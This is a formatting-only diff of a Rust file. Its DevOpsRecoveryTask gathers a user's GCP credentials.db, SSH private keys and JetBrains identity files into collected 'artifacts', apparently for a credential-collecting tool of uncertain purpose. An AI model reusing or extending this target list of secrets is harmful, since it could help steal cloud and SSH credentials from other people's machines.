@@ -67,10 +67,7 @@ impl DevOpsRecoveryTask {
 
         specs.push(DevOpsSpec {
             label: "GCP Credentials".into(),
-            path: home
-                .join(".config")
-                .join("gcloud")
-                .join("credentials.db"),
+            path: home.join(".config").join("gcloud").join("credentials.db"),
             is_dir: false,
             filters: None,
         });
@@ -109,8 +106,13 @@ impl DevOpsRecoveryTask {
             path: home.join(".ssh"),
             is_dir: true,
             filters: Some(vec![
-                "id_rsa".into(), "id_ed25519".into(), "id_ecdsa".into(), "id_dsa".into(),
-                "known_hosts".into(), "config".into(), "authorized_keys".into(),
+                "id_rsa".into(),
+                "id_ed25519".into(),
+                "id_ecdsa".into(),
+                "id_dsa".into(),
+                "known_hosts".into(),
+                "config".into(),
+                "authorized_keys".into(),
             ]),
         });
 
@@ -174,7 +176,11 @@ impl DevOpsRecoveryTask {
             label: "JetBrains".into(),
             path: appdata.join("JetBrains"),
             is_dir: true,
-            filters: Some(vec!["options".into(), "keymaps".into(), "permanent_id".into()]),
+            filters: Some(vec![
+                "options".into(),
+                "keymaps".into(),
+                "permanent_id".into(),
+            ]),
         });
 
         Self { specs }
@@ -229,7 +235,7 @@ impl RecoveryTask for DevOpsRecoveryTask {
                                     &target,
                                     &spec.label,
                                     &mut task_artifacts,
-                                    10, // depth
+                                    10,  // depth
                                     100, // limit
                                 )
                                 .await;
